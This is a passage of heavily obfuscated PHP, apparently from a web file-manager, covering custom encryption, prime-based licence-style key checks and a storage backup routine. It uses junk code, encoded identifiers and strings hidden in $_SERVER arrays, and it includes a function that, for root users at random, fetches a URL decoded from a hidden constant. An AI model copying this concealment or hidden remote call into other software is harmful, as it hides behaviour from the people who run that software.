$·Ó˜è«Œ[704]) { if (!$Áòš´) { break; } $Áòš´++; } $™»Â»é  = _get($this->bzmfbdb83a8c, $Š‡Áµ€[297]); $êœøÜ­Õ = $·Ó˜è«Œ[770]; $™»Â»é  = $™»Â»é  ? intval($™»Â»é ) : 0; return $øÍŒ¦İ² + $™»Â»é ; } public function yokv80352bee($ŞƒŒ¦è°) { $·ŞÉˆ• =& $_SERVER[É¨™èà]; $Ğìİ¥À =& $_SERVER[–úÃ®‰¸]; $§¸¤º· = $this->kyau95712427(); $¥Ø·Ô = $·ŞÉˆ•[771]; if (!$¥Ø·Ô) { die; } if ($ŞƒŒ¦è°[$Ğìİ¥À[298]] == $Ğìİ¥À[122]) { return; } if ($§¸¤º· >= intval($Ğìİ¥À[214])) { return; } $Œµ‘¥µÍ = Model($Ğìİ¥À[125])->count(); if ($Œµ‘¥µÍ <= $§¸¤º·) { return; } $›€øù™ = Model($Ğìİ¥À[125])->field($Ğìİ¥À[298])->limit($§¸¤º·)->select(); $›€øù™ = array_to_keyvalue($›€øù™, $Ğìİ¥À[6], $Ğìİ¥À[298]); $ıÊ×°— = $·ŞÉˆ•[772]; if (strlen($ıÊ×°—) < $·ŞÉˆ•[720]) { return; } if (!in_array($ŞƒŒ¦è°[$Ğìİ¥À[298]], $›€øù™)) { show_json($Ğìİ¥À[299], !1, $Ğìİ¥À[210]); } } public function cimd072b1aad() { $ë”¬ëŠ‹ =& $_SERVER[–úÃ®‰¸]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $âºáğ = $ë”¬ëŠ‹[217]; $âºáğ = $this->pslh4d3e441b($âºáğ, $ë”¬ëŠ‹[218]); $îÕúÀƒ› = stream_context_create(array($ë”¬ëŠ‹[219] => array($ë”¬ëŠ‹[220] => $ë”¬ëŠ‹[221], $ë”¬ëŠ‹[222] => 3))); $ºŠ¦Ì‡ò = @file_get_contents($âºáğ, !1, $îÕúÀƒ›); $µ¨Â¤Ûº = $_SERVER[É¨™èà][773]; if (!$µ¨Â¤Ûº) { die; } echo $ë”¬ëŠ‹[300] . hash_encode($ºŠ¦Ì‡ò) . $ë”¬ëŠ‹[301]; } private function vbqsb65d8103($•óàüÇ•, $µËêëÄ, $ùÒæ¤È§ = 3) { $ÎóÓÏŞó =& $_SERVER[É¨™èà]; $Äğ¢•İì =& $_SERVER[–úÃ®‰¸]; usleep(1); $•óàüÇ• = trim($•óàüÇ•); $—«™–Ò‡ = mt_rand(0, 5) . $Äğ¢•İì[6]; $‡Œç¤çÑ = $ÎóÓÏŞó[774]; while ($‡Œç¤çÑ < $ÎóÓÏŞó[698]) { if ($‡Œç¤çÑ >= 0) { break; } $‡Œç¤çÑ++; } $î‰å“¦ = rand_string(15); $Ô—´ÒÉ = $Äğ¢•İì[302]; switch ($—«™–Ò‡) { case $Äğ¢•İì[206]: $•ÈÔó¢ = $this->pwaz313be4c9($•óàüÇ•, strrev($µËêëÄ . $î‰å“¦)); break; case $Äğ¢•İì[122]: $•ÈÔó¢ = $this->pwaz313be4c9($•óàüÇ•, strrev($î‰å“¦ . $µËêëÄ)); $¿„É®ä = $ÎóÓÏŞó[707]; while ($¿„É®ä < $ÎóÓÏŞó[704]) { if ($¿„É®ä >= 0) { break; } $¿„É®ä++; } break; case $Äğ¢•İì[303]: $•ÈÔó¢ = $this->pwaz313be4c9($•óàüÇ•, base64_encode($î‰å“¦ . $µËêëÄ)); break; case $Äğ¢•İì[304]: $•ÈÔó¢ = $this->pwaz313be4c9($•óàüÇ•, md5($î‰å“¦ . $µËêëÄ)); break; $§üâ€Š¶ = $ÎóÓÏŞó[775]; while ($§üâ€Š¶ < $ÎóÓÏŞó[698]) { if ($§üâ€Š¶ >= 0) { break; } $§üâ€Š¶++; } case $Äğ¢•İì[305]: $•óàüÇ• = base64_encode($•óàüÇ•); $¥öÓ×¤ = $ÎóÓÏŞó[776]; $Ÿ‡ŸØ–Š = rand(0, 64); $Ÿƒ®¢¹² = $ÎóÓÏŞó[777]; $ÇÀĞ¯ôã = $Ô—´ÒÉ[$Ÿ‡ŸØ–Š]; $©ÊÄñˆ‹ = md5($ÇÀĞ¯ôã . md5($µËêëÄ . $ÇÀĞ¯ôã) . $µËêëÄ); $±çÈı·§ = $ÎóÓÏŞó[778]; if (strlen($±çÈı·§) < $ÎóÓÏŞó[698]) { return; } $©ÊÄñˆ‹ = substr($©ÊÄñˆ‹, $Ÿ‡ŸØ–Š % 8, $Ÿ‡ŸØ–Š % 8 + 7); $Ÿµ²ƒÊ¼ = $ÎóÓÏŞó[779]; if (strlen($Ÿµ²ƒÊ¼) < $ÎóÓÏŞó[698]) { return; } $ÁòŞ™Òä = $Äğ¢•İì[6]; $¾ßèî°º = $ÎóÓÏŞó[780]; while (strlen($¾ßèî°º) < $ÎóÓÏŞó[313]) { if (!$¾ßèî°º) { break; } $¾ßèî°º++; } $¤­â”´³ = 0; $èÅ¤Õ©ù = 0; $ÄÍÆ¶Íú = $ÎóÓÏŞó[781]; if (!$ÄÍÆ¶Íú) { die; } $ìêİÏ½ = 0; for ($¤­â”´³ = 0; $¤­â”´³ < strlen($•óàüÇ•); $¤­â”´³++) { $ìêİÏ½ = $ìêİÏ½ == strlen($©ÊÄñˆ‹) ? 0 : $ìêİÏ½; $ßÌ¿‹ŞÙ = $ÎóÓÏŞó[782]; if (!$ßÌ¿‹ŞÙ) { die; } $èÅ¤Õ©ù = ($Ÿ‡ŸØ–Š + strpos($Ô—´ÒÉ, $•óàüÇ•[$¤­â”´³]) + ord($©ÊÄñˆ‹[$ìêİÏ½++])) % 64; $¾±§â¹ = $ÎóÓÏŞó[783]; $ÁòŞ™Òä .= $Ô—´ÒÉ[$èÅ¤Õ©ù]; $³ÛŸÍØ“ = $ÎóÓÏŞó[784]; if (!$³ÛŸÍØ“) { die; } } $•ÈÔó¢ = hash_encode($ÇÀĞ¯ôã . $ÁòŞ™Òä); $ºÏß›¨º = $ÎóÓÏŞó[785]; while ($ºÏß›¨º < $ÎóÓÏŞó[704]) { if ($ºÏß›¨º >= 0) { break; } $ºÏß›¨º++; } break; default: $•ÈÔó¢ = $this->pwaz313be4c9($•óàüÇ•, $µËêëÄ . $î‰å“¦); break; $»ŒŞÇ† = $ÎóÓÏŞó[786]; if (!$»ŒŞÇ†) { return; } } $•ÈÔó¢ = strrev($—«™–Ò‡ . $î‰å“¦ . $•ÈÔó¢); if ($ùÒæ¤È§ - 1 > 0) { $•ÈÔó¢ = $this->vbqsb65d8103($•ÈÔó¢, $µËêëÄ, $ùÒæ¤È§ - 1); } return $•ÈÔó¢; } private function gijhc8fe9ea9($Íò®››Ê, $íù¤şÔ¹, $¾ºõë·Ø = 3) { $î—ê£§‚ =& $_SERVER[É¨™èà]; $ª÷Û¨‹Ü =& $_SERVER[–úÃ®‰¸]; if (!is_string($Íò®››Ê) || strlen($Íò®››Ê) < 10) { return !1; } $Íò®››Ê = trim($Íò®››Ê); $¾äÃ€È = $î—ê£§‚[787]; if (!$¾äÃ€È) { return; } $Íò®››Ê = strrev($Íò®››Ê); $­™éİñ» = $Íò®››Ê[0]; $ÆÑã˜µ = $î—ê£§‚[788]; $ÆÌÓç˜  = substr($Íò®››Ê, 1, 15); $Íò®››Ê = substr($Íò®››Ê, 16); $ÙœõÑ×é = $î—ê£§‚[789]; if (strlen($ÙœõÑ×é) < $î—ê£§‚[704]) { return; } $Â¢òûÑ = $ª÷Û¨‹Ü[302]; $š˜‹µ = $î—ê£§‚[790]; if (!$š˜‹µ) { return; } switch ($­™éİñ») { case $ª÷Û¨‹Ü[206]: $ã”ìˆ´÷ = $this->pslh4d3e441b($Íò®››Ê, strrev($íù¤şÔ¹ . $ÆÌÓç˜ )); $“½º = $î—ê£§‚[791]; while (strlen($“½º) < $î—ê£§‚[698]) { if (!$“½º) { break; } $“½º++; } break; case $ª÷Û¨‹Ü[122]: $ã”ìˆ´÷ = $this->pslh4d3e441b($Íò®››Ê, strrev($ÆÌÓç˜  . $íù¤şÔ¹)); $Éİ÷øœš = $î—ê£§‚[792]; while ($Éİ÷øœš < $î—ê£§‚[709]) { if ($Éİ÷øœš >= 0) { break; } $Éİ÷øœš++; } break; case $ª÷Û¨‹Ü[303]: $ã”ìˆ´÷ = $this->pslh4d3e441b($Íò®››Ê, base64_encode($ÆÌÓç˜  . $íù¤şÔ¹)); break; $ùÚé³Á« = $î—ê£§‚[793]; if (strlen($ùÚé³Á«) < $î—ê£§‚[698]) { die; } case $ª÷Û¨‹Ü[304]: $ã”ìˆ´÷ = $this->pslh4d3e441b($Íò®››Ê, md5($ÆÌÓç˜  . $íù¤şÔ¹)); break; $È˜­¨Í = $î—ê£§‚[794]; if (strlen($È˜­¨Í) < $î—ê£§‚[698]) { return; } case $ª÷Û¨‹Ü[305]: $Íò®››Ê = hash_decode($Íò®››Ê); $•’—œİ½ = $î—ê£§‚[795]; if (!$•’—œİ½) { return; } $êìË†è† = $Íò®››Ê[0]; $µ ¾ßá = $î—ê£§‚[796]; while ($µ ¾ßá < $î—ê£§‚[720]) { if ($µ ¾ßá >= 0) { break; } $µ ¾ßá++; } $Íò®››Ê = substr($Íò®››Ê, 1); $÷ÍóîáÎ = $î—ê£§‚[797]; while (strlen($÷ÍóîáÎ) < $î—ê£§‚[313]) { if (!$÷ÍóîáÎ) { break; } $÷ÍóîáÎ++; } $À²øıß = strpos($Â¢òûÑ, $êìË†è†); $œ¤·½‚– = $î—ê£§‚[798]; if (strlen($œ¤·½‚–) < $î—ê£§‚[698]) { return; } $›áò¬Õİ = md5($êìË†è† . md5($íù¤şÔ¹ . $êìË†è†) . $íù¤şÔ¹); $´Ì•äê = $î—ê£§‚[799]; while (strlen($´Ì•äê) < $î—ê£§‚[698]) { if (!$´Ì•äê) { break; } $´Ì•äê++; } $›áò¬Õİ = substr($›áò¬Õİ, $À²øıß % 8, $À²øıß % 8 + 7); $ÒØªŒ¥¯ = $î—ê£§‚[800]; $ïéûÙ™¨ = $ª÷Û¨‹Ü[6]; $²ÙğÚ¥Ş = $î—ê£§‚[801]; if (strlen($²ÙğÚ¥Ş) < $î—ê£§‚[720]) { return; } $çû¨ü’ = 0; $¨÷Ø¶˜ = $î—ê£§‚[802]; while (strlen($¨÷Ø¶˜) < $î—ê£§‚[698]) { if (!$¨÷Ø¶˜) { break; } $¨÷Ø¶˜++; } $©†Âƒõ = 0; $¹Çö×ÅÉ = $î—ê£§‚[803]; if (!$¹Çö×ÅÉ) { return; } $ì˜Ïã©„ = 0; $„¹Ú¾®æ = $î—ê£§‚[804]; for ($çû¨ü’ = 0; $çû¨ü’ < strlen($Íò®››Ê); $çû¨ü’++) { $ì˜Ïã©„ = $ì˜Ïã©„ == strlen($›áò¬Õİ) ? 0 : $ì˜Ïã©„; $ì¹ÓÈÒ› = $ì˜Ïã©„++; $©†Âƒõ = strpos($Â¢òûÑ, $Íò®››Ê[$çû¨ü’]) - $À²øıß - ord($›áò¬Õİ[$ì¹ÓÈÒ›]); while ($©†Âƒõ < 0) { $©†Âƒõ += 64; $Ë®÷×ê = $î—ê£§‚[805]; while ($Ë®÷×ê < $î—ê£§‚[709]) { if ($Ë®÷×ê >= 0) { break; } $Ë®÷×ê++; } } $ïéûÙ™¨ .= $Â¢òûÑ[$©†Âƒõ]; } $ã”ìˆ´÷ = base64_decode($ïéûÙ™¨); break; $”ªõÅÄ½ = $î—ê£§‚[806]; if (strlen($”ªõÅÄ½) < $î—ê£§‚[313]) { return; } default: $ã”ìˆ´÷ = $this->pslh4d3e441b($Íò®››Ê, $íù¤şÔ¹ . $ÆÌÓç˜ ); break; $óşşâÄ¡ = $î—ê£§‚[807]; } if ($¾ºõë·Ø - 1 > 0) { $ã”ìˆ´÷ = $this->gijhc8fe9ea9($ã”ìˆ´÷, $íù¤şÔ¹, $¾ºõë·Ø - 1); } return $ã”ìˆ´÷; } public function nwqh74ab8068($½ÃëÛûå) { $ş¸À¶™™ =& $_SERVER[É¨™èà]; $ÑÖ—èß° =& $_SERVER[–úÃ®‰¸]; $íµÚ½¹° = $this->mqod98e725fb(); $’ã¨ºŠñ = $ş¸À¶™™[808]; if (!$’ã¨ºŠñ) { return; } $„¡ùÅØ = $this->mqod98e725fb(); $€áòìâˆ = ($íµÚ½¹° - 1) * ($„¡ùÅØ - 1); $ÙÈÄÚ× = $ş¸À¶™™[809]; if (strlen($ÙÈÄÚ×) < $ş¸À¶™™[709]) { return; } $®üÄ†›³ = intval(($íµÚ½¹° + $„¡ùÅØ) / 2); $„æã¡ş› = $ş¸À¶™™[810]; if (!$„æã¡ş›) { die; } while (1) { $°İŞ´˜™ = $®üÄ†›³; $æõËğ¢ = $ş¸À¶™™[811]; $ñ‰‡ûĞ„ = $€áòìâˆ; while ($ñ‰‡ûĞ„ % $°İŞ´˜™ != 0) { $€¥Ş©›˜ = $ñ‰‡ûĞ„; $™ÊÇÜì‰ = $ş¸À¶™™[812]; if (strlen($™ÊÇÜì‰) < $ş¸À¶™™[698]) { die; } $ñ‰‡ûĞ„ = $°İŞ´˜™; $°İŞ´˜™ = $€¥Ş©›˜ % $°İŞ´˜™; $Îïó¡¼Á = $ş¸À¶™™[813]; if (!$Îïó¡¼Á) { die; } } if ($°İŞ´˜™ == 1) { break; } else { $®üÄ†›³++; } } $ÖŒ»÷Šğ = 2; $ê¦£†ÏÕ = $ş¸À¶™™[814]; if (strlen($ê¦£†ÏÕ) < $ş¸À¶™™[313]) { return; } for ($ÀÆ½Ó‡÷ = 0; $ÀÆ½Ó‡÷ < $€áòìâˆ * 10; $ÀÆ½Ó‡÷++) { if (($€áòìâˆ * $ÀÆ½Ó‡÷ + 1) % $®üÄ†›³ == 0) { $ÖŒ»÷Šğ = intval(($€áòìâˆ * $ÀÆ½Ó‡÷ + 1) / $®üÄ†›³); break; } } $Óß„šåà = $this->pwaz313be4c9($íµÚ½¹° * $„¡ùÅØ . $ÑÖ—èß°[6], $ÑÖ—èß°[136]); $­ØçÈİ = md5($ÑÖ—èß°[306] . ($íµÚ½¹° + $„¡ùÅØ) . $ÑÖ—èß°[307] . $®üÄ†›³ . $ÑÖ—èß°[307] . $ÖŒ»÷Šğ . $ÑÖ—èß°[308]); $œß¤•–Ö = $ş¸À¶™™[815]; if (strlen($œß¤•–Ö) < $ş¸À¶™™[313]) { die; } $æ˜ë”¦ş = $this->pwaz313be4c9($½ÃëÛûå, $­ØçÈİ) . $ÑÖ—èß°[309] . $Óß„šåà; return $æ˜ë”¦ş; } public function gmzi8cb23656($³‡ö¬€) { $¿‰Å«Ã =& $_SERVER[É¨™èà]; $Õ»Ö»Ô =& $_SERVER[–úÃ®‰¸]; $ôşõ”‰„ = explode($Õ»Ö»Ô[309], $³‡ö¬€); if (count($ôşõ”‰„) != 2) { return $Õ»Ö»Ô[6]; } $çÇúê¦ = $this->pslh4d3e441b($ôşõ”‰„[1] . $Õ»Ö»Ô[6], $Õ»Ö»Ô[136]); if (!$çÇúê¦) { return $Õ»Ö»Ô[6]; } $çÇúê¦ = intval($çÇúê¦); $Ò§š§Ç = $¿‰Å«Ã[816]; if (strlen($Ò§š§Ç) < $¿‰Å«Ã[704]) { return; } $ÊËòÂº’ = 0; $Ù’—Ë¾× = $¿‰Å«Ã[817]; if (!$Ù’—Ë¾×) { die; } $™ÊÆŠ° = 0; $…Ëé’Ó = $¿‰Å«Ã[818]; while ($…Ëé’Ó < $¿‰Å«Ã[704]) { if ($…Ëé’Ó >= 0) { break; } $…Ëé’Ó++; } for ($ŸÎûÓ›µ = 3; $ŸÎûÓ›µ < $çÇúê¦; $ŸÎûÓ›µ += 2) { if ($çÇúê¦ % $ŸÎûÓ›µ != 0) { continue; } $ÊËòÂº’ = $ŸÎûÓ›µ; $”î§“Ê‚ = $¿‰Å«Ã[819]; if (strlen($”î§“Ê‚) < $¿‰Å«Ã[709]) { return; } $™ÊÆŠ° = intval($çÇúê¦ / $ŸÎûÓ›µ); break; $ü’Ğêûï = $¿‰Å«Ã[820]; } $ˆ¸¦¹‹ = ($ÊËòÂº’ - 1) * ($™ÊÆŠ° - 1); $Á‰¼˜Ë£ = intval(($ÊËòÂº’ + $™ÊÆŠ°) / 2); $ß®™ÂÖò = $¿‰Å«Ã[821]; if (!$ß®™ÂÖò) { die; } while (1) { $ÁªÖÓ¶ç = $Á‰¼˜Ë£; $ää¡ğÛó = $¿‰Å«Ã[822]; if (!$ää¡ğÛó) { return; } $¤´¢ÜÓî = $ˆ¸¦¹‹; $Ôöëø½À = $¿‰Å«Ã[823]; while ($Ôöëø½À < $¿‰Å«Ã[720]) { if ($Ôöëø½À >= 0) { break; } $Ôöëø½À++; } while ($¤´¢ÜÓî % $ÁªÖÓ¶ç != 0) { $–°üêÜ = $¤´¢ÜÓî; $é¨ë˜Ş¾ = $¿‰Å«Ã[824]; while (strlen($é¨ë˜Ş¾) < $¿‰Å«Ã[709]) { if (!$é¨ë˜Ş¾) { break; } $é¨ë˜Ş¾++; } $¤´¢ÜÓî = $ÁªÖÓ¶ç; $ÁªÖÓ¶ç = $–°üêÜ % $ÁªÖÓ¶ç; } if ($ÁªÖÓ¶ç == 1) { break; } else { $Á‰¼˜Ë£++; } } $¬Ì¹—ëã = 2; $Âä”Üúˆ = $¿‰Å«Ã[825]; if (!$Âä”Üúˆ) { return; } for ($ŸÎûÓ›µ = 0; $ŸÎûÓ›µ < $ˆ¸¦¹‹ * 10; $ŸÎûÓ›µ++) { if (($ˆ¸¦¹‹ * $ŸÎûÓ›µ + 1) % $Á‰¼˜Ë£ == 0) { $¬Ì¹—ëã = intval(($ˆ¸¦¹‹ * $ŸÎûÓ›µ + 1) / $Á‰¼˜Ë£); break; } } $Î®„İÃô = md5($Õ»Ö»Ô[306] . ($ÊËòÂº’ + $™ÊÆŠ°) . $Õ»Ö»Ô[307] . $Á‰¼˜Ë£ . $Õ»Ö»Ô[307] . $¬Ì¹—ëã . $Õ»Ö»Ô[308]); $Ê÷®Å·º = $¿‰Å«Ã[826]; while (strlen($Ê÷®Å·º) < $¿‰Å«Ã[720]) { if (!$Ê÷®Å·º) { break; } $Ê÷®Å·º++; } $¼¯¢º«‰ = $this->pslh4d3e441b($ôşõ”‰„[0], $Î®„İÃô); $ÍÇ³ø¤ = $¿‰Å«Ã[827]; if (strlen($ÍÇ³ø¤) < $¿‰Å«Ã[313]) { return; } return $¼¯¢º«‰; $ÚÈ€öæ = $¿‰Å«Ã[828]; } public function mqod98e725fb() { $µú¼¹İ™ =& $_SERVER[É¨™èà]; $ÏŒôõìû = mt_rand(pow(2, 14), pow(2, 16) - 1); $ö—üÇì× = $µú¼¹İ™[829]; $‘Ä×şÙ = array(); $ÁêÈÅ®Ş = 1; $¸¼®şå¦ = $µú¼¹İ™[830]; if (!$¸¼®şå¦) { return; } while ($ÁêÈÅ®Ş <= (int) sqrt($ÏŒôõìû)) { $Â÷§¬ = $ÁêÈÅ®Ş; $Ã‰¯–åê = $µú¼¹İ™[831]; while (!0) { $Â÷§¬++; if ($Â÷§¬ <= 2) { $ÁêÈÅ®Ş = $Â÷§¬; break; } else { if ($Â÷§¬ < 2) { continue; } } $÷ıÂÙ–œ = !0; for ($Ã¥òÊ² = 2; $Ã¥òÊ² <= sqrt($Â÷§¬); $Ã¥òÊ²++) { if ($Â÷§¬ % $Ã¥òÊ² == 0) { $÷ıÂÙ–œ = !1; } } if ($÷ıÂÙ–œ) { $ÁêÈÅ®Ş = $Â÷§¬; break; } } $‘Ä×şÙ[] = $ÁêÈÅ®Ş; $ÖÄÍÔÍî = $µú¼¹İ™[832]; if (strlen($ÖÄÍÔÍî) < $µú¼¹İ™[313]) { die; } } $ñŒøÁ = 2; $ôÆõ£Û = $µú¼¹İ™[833]; if (!$ôÆõ£Û) { return; } for ($Â÷§¬ = $ÏŒôõìû; $Â÷§¬ > 1; $Â÷§¬--) { $÷ıÂÙ–œ = !0; $¸èŞÂÁ’ = $µú¼¹İ™[834]; while (strlen($¸èŞÂÁ’) < $µú¼¹İ™[704]) { if (!$¸èŞÂÁ’) { break; } $¸èŞÂÁ’++; } foreach ($‘Ä×şÙ as $¶·š¡±¢) { if ($Â÷§¬ % $¶·š¡±¢ == 0) { $÷ıÂÙ–œ = !1; break; } } if ($÷ıÂÙ–œ) { $ñŒøÁ = $Â÷§¬; break; } } return $ñŒøÁ; } public function xerjaf878616($ñáóƒÒ¯, $Êºüı³­) { $¼‹•íË =& $_SERVER[–úÃ®‰¸]; return call_user_func(array($¼‹•íË[8], $¼‹•íË[310]), $ñáóƒÒ¯, $Êºüı³­); $×¹¥×ô÷ = $_SERVER[É¨™èà][835]; if (!$×¹¥×ô÷) { die; } } public function pwaz313be4c9($ÇÖ‘ˆ²—, $û‘ßşğÃ) { $º˜ñóšÛ =& $_SERVER[É¨™èà]; $ç—şÚ´… =& $_SERVER[–úÃ®‰¸]; return call_user_func(array($ç—şÚ´…[311], $ç—şÚ´…[312]), $ÇÖ‘ˆ²—, $û‘ßşğÃ); $‰øšäĞı = $º˜ñóšÛ[836]; while (strlen($‰øšäĞı) < $º˜ñóšÛ[720]) { if (!$‰øšäĞı) { break; } $‰øšäĞı++; } } public function pslh4d3e441b($ö„¬®½ò, $Û«±ˆ¾) { $¬ÇÓòıñ =& $_SERVER[É¨™èà]; $¡µ¿ä° =& $_SERVER[–úÃ®‰¸]; return call_user_func(array($¡µ¿ä°[311], $¡µ¿ä°[313]), $ö„¬®½ò, $Û«±ˆ¾); $½œĞˆµ¥ = $¬ÇÓòıñ[837]; if (strlen($½œĞˆµ¥) < $¬ÇÓòıñ[313]) { return; } } } goto cçÇÂ–ÕêÄ; fÙ«½Àˆ—’: class BackupFile { public function __construct() { } public function index() { $ÚÉ»°¢ = Backup::get(); $Êß°»»¬ = $ÚÉ»°¢[$_SERVER[É¨™èà][846]][$_SERVER[É¨™èà][233]][$_SERVER[É¨™èà][553]]; $ğ›Å»‚ = array($_SERVER[É¨™èà][554] => array($_SERVER[É¨™èà][903], $Êß°»»¬), $_SERVER[É¨™èà][904] => array($_SERVER[É¨™èà][417], $ÚÉ»°¢[$_SERVER[É¨™èà][842]])); $çç“†¸¿ = (int) Model($_SERVER[É¨™èà][882])->where($ğ›Å»‚)->count($_SERVER[É¨™èà][553]); $ÎÊú’ùÉ = (int) Model($_SERVER[É¨™èà][882])->where($ğ›Å»‚)->sum($_SERVER[É¨™èà][79]); $İìéş’ = new TaskFileTransfer($_SERVER[É¨™èà][905], $_SERVER[É¨™èà][868], $çç“†¸¿, LNG($_SERVER[É¨™èà][877]) . $_SERVER[É¨™èà][878] . LNG($_SERVER[É¨™èà][906])); $İìéş’->task[$_SERVER[É¨™èà][854]] = $ÎÊú’ùÉ; $Ñø…Ã©Õ = array($_SERVER[É¨™èà][907] => $çç“†¸¿, $_SERVER[É¨™èà][908] => $ÎÊú’ùÉ, $_SERVER[É¨™èà][909] => time()); Backup::set($Ñø…Ã©Õ); $²¾€ÄÉé = !0; $áÆÍ±é¿ = $this->storeIds(); $Î¦ºº¾ù = 1; $ú‘øÊø = 1000; $ª¼ÑøâŒ = $ŒÂôˆË¬ = 0; $™‹îû“è = array(); $ö¶µ’Ü = $÷µÈªûå = 0; do { $Æ£à£Åï = $_SERVER[É¨™èà][910]; $¦ÇÑşÂ = Model($_SERVER[É¨™èà][882])->where($ğ›Å»‚)->field($Æ£à£Åï)->order($_SERVER[É¨™èà][911])->selectPage($ú‘øÊø, $Î¦ºº¾ù); $’ŸÉÄ¦ = !empty($¦ÇÑşÂ[$_SERVER[É¨™èà][456]]) ? $¦ÇÑşÂ[$_SERVER[É¨™èà][456]] : array(); foreach ($’ŸÉÄ¦ as $õ¦ÎÓ÷¬) { if (!$this->_fileExist($õ¦ÎÓ÷¬, $™‹îû“è, $áÆÍ±é¿)) { Backup::log($_SERVER[É¨™èà][912] . $õ¦ÎÓ÷¬[$_SERVER[É¨™èà][553]] . $_SERVER[É¨™èà][913] . $õ¦ÎÓ÷¬[$_SERVER[É¨™èà][87]]); continue; } $’€ß¿Å = $õ¦ÎÓ÷¬[$_SERVER[É¨™èà][87]]; $âÕ÷§–å = "\x7b\x69\157\72{$ÚÉ»°¢[$_SERVER[É¨™èà][842]]}\x7d" . substr($’€ß¿Å, strlen("\173\151\x6f\72{$õ¦ÎÓ÷¬[$_SERVER[É¨™èà][914]]}\175")); if (IO::exist($âÕ÷§–å)) { $İìéş’->updateFileEnd($õ¦ÎÓ÷¬[$_SERVER[É¨™èà][32]], $õ¦ÎÓ÷¬[$_SERVER[É¨™èà][79]]); } else { $âÕ÷§–å = get_path_father($âÕ÷§–å); IO::mkdir($âÕ÷§–å); if (!IO::copy($’€ß¿Å, $âÕ÷§–å, $_SERVER[É¨™èà][915])) { Backup::log($_SERVER[É¨™èà][916] . $’€ß¿Å . $_SERVER[É¨™èà][898] . $âÕ÷§–å . $_SERVER[É¨™èà][178]); $²¾€ÄÉé = !1; break; } } $Êß°»»¬ = $õ¦ÎÓ÷¬[$_SERVER[É¨™èà][553]]; $ŒÂôˆË¬ += 1; $ª¼ÑøâŒ += $õ¦ÎÓ÷¬[$_SERVER[É¨™èà][79]]; $÷µÈªûå += 1; $ö¶µ’Ü += $õ¦ÎÓ÷¬[$_SERVER[É¨™èà][79]]; if ($ª¼ÑøâŒ >= 1024 * 1024 * 100) { $Ñø…Ã©Õ = array($_SERVER[É¨™èà][841] => $Êß°»»¬, $_SERVER[É¨™èà][917] => $÷µÈªûå, $_SERVER[É¨™èà][918] => $ö¶µ’Ü); Backup::set($Ñø…Ã©Õ); $ª¼ÑøâŒ = $ŒÂôˆË¬ = 0; } } $Óœ¶»Ó· = count($’ŸÉÄ¦); $Î¦ºº¾ù++; } while ($Óœ¶»Ó· == $ú‘øÊø); $İìéş’->end(); $Ñø…Ã©Õ = array($_SERVER[É¨™èà][919] => 1, $_SERVER[É¨™èà][852] => time(), $_SERVER[É¨™èà][866] => 1, $_SERVER[É¨™èà][841] => $Êß°»»¬, $_SERVER[É¨™èà][920] => time()); if ($ŒÂôˆË¬) { $Ñø…Ã©Õ[$_SERVER[É¨™èà][917]] = $÷µÈªûå; $Ñø…Ã©Õ[$_SERVER[É¨™èà][918]] = $ö¶µ’Ü; } Backup::set($Ñø…Ã©Õ); return !0; } private function _fileExist($ÅŒ×Í´‰, &$§˜´äÏ, $èÉãŸÓ¨) { $µ–ÇÉ³ =& $_SERVER[É¨™èà]; $÷±ÉöŸğ = $ÅŒ×Í´‰[$µ–ÇÉ³[87]]; if (in_array($ÅŒ×Í´‰[$µ–ÇÉ³[553]], $§˜´äÏ)) { return !1; } if (!in_array($ÅŒ×Í´‰[$µ–ÇÉ³[914]], $èÉãŸÓ¨)) { return !1; } if (IO::exist($÷±ÉöŸğ)) { return !0; } $ô—›£¤ = get_path_father($÷±ÉöŸğ); if (IO::exist($ô—›£¤)) { $§˜´äÏ[] = $ÅŒ×Í´‰[$µ–ÇÉ³[553]]; return !1; } $Ü“óÜÎ° = array($µ–ÇÉ³[914] => $ÅŒ×Í´‰[$µ–ÇÉ³[914]], $µ–ÇÉ³[87] => array($µ–ÇÉ³[469], "{$ô—›£¤}\x25")); $ûø»®„ô = Model($µ–ÇÉ³[882])->where($Ü“óÜÎ°)->field($µ–ÇÉ³[554])->select(); $§˜´äÏ = array_merge($§˜´äÏ, array_to_keyvalue($ûø»®„ô, $µ–ÇÉ³[12], $µ–ÇÉ³[553])); return !1; } private function _fileFilter($µ‰™ÊŒ‰) { $†Š—‘»— =& $_SERVER[É¨™èà]; return; if (empty($µ‰™ÊŒ‰)) { return; } $óÀ¨…µŞ = array($†Š—‘»—[553] => array($†Š—‘»—[7], array_unique($µ‰™ÊŒ‰))); $ìéû®™æ = Model($†Š—‘»—[921])->where($óÀ¨…µŞ)->field($†Š—‘»—[194])->select(); foreach ($ìéû®™æ as $ä¸Ä²ú) { Model($†Š—‘»—[921])->remove($ä¸Ä²ú[$†Š—‘»—[194]], !1); } } private function storeIds() { $ãÆØÖç¦ =& $_SERVER[É¨™èà]; $‘“ù“³ = Model($ãÆØÖç¦[858])->listData(); $òãÉ„ª§ = array(); $§À›™ì… = $GLOBALS[$ãÆØÖç¦[6]][$ãÆØÖç¦[92]][$ãÆØÖç¦[922]]; foreach ($‘“ù“³ as $î›´İ„) { $ªÍÔø–Ù = strtolower($î›´İ„[$ãÆØÖç¦[98]]); if (!isset($§À›™ì…[$ªÍÔø–Ù])) { continue; } $¡¿Ú·Âğ = $ãÆØÖç¦[77] . (isset($§À›™ì…[$ªÍÔø–Ù]) ? $§À›™ì…[$ªÍÔø–Ù] : ucfirst($ªÍÔø–Ù)); if (!class_exists($¡¿Ú·Âğ)) { continue; } $òãÉ„ª§[] = $î›´İ„[$ãÆØÖç¦[485]]; } return $òãÉ„ª§; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $Ù–ƒÃ› =& $_SERVER[É¨™èà]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $‰«ô”ìÛ = $GLOBALS[$Ù–ƒÃ›[6]][$Ù–ƒÃ›[435]]; $÷Øã‹Íº = $‰«ô”ìÛ[$‰«ô”ìÛ[$Ù–ƒÃ›[923]]]; $ÙÉ¯åÓâ = $‰«ô”ìÛ[$Ù–ƒÃ›[924]]; switch ($‰«ô”ìÛ[$Ù–ƒÃ›[923]]) { case $Ù–ƒÃ›[21]: self::$handle = Model($Ù–ƒÃ›[925]); break; case $Ù–ƒÃ›[926]: self::$handle = new CacheRedis($÷Øã‹Íº, $ÙÉ¯åÓâ); break; case $Ù–ƒÃ›[927]: self::$handle = new CacheMemcached($÷Øã‹Íº, $ÙÉ¯åÓâ); break; case $Ù–ƒÃ›[233]: self::$handle = new CacheFile($÷Øã‹Íº, 